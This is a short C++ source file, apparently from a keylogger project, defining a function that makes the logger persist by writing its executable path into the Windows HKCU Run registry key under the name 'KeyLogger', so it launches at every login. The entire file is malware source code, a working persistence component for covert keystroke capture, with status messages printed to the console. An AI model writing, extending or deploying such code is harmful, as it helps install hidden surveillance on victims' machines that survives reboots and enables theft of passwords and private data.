#include "KeyLogger.h"

void CreatePersistence(std::string pathToExecutable)
{
    HKEY windowsRunKey;
    LONG result = RegOpenKeyEx(
        HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
        KEY_WRITE, &windowsRunKey);

    if (result == ERROR_FILE_NOT_FOUND)
    {
        std::cout << "Could not create persistence. Key not found." << std::endl;
    }

    if (result == ERROR_ACCESS_DENIED)
    {
        std::cout << "Could not create persistence. Not running as administrator." << std::endl;
    }
    
    if (result == ERROR_SUCCESS)
    {
        const auto value = std::wstring(pathToExecutable.begin(), pathToExecutable.end());
        result = RegSetValueEx(
            windowsRunKey,
            TEXT("KeyLogger"),
            0,
            REG_SZ,
            reinterpret_cast<const BYTE*>(value.c_str()), 
            (value.size() + 1) * sizeof(wchar_t));
        
        if (result == ERROR_SUCCESS)
        {
            std::cout << "Created persistence." << std::endl;
        }

        RegCloseKey(windowsRunKey);
    }
}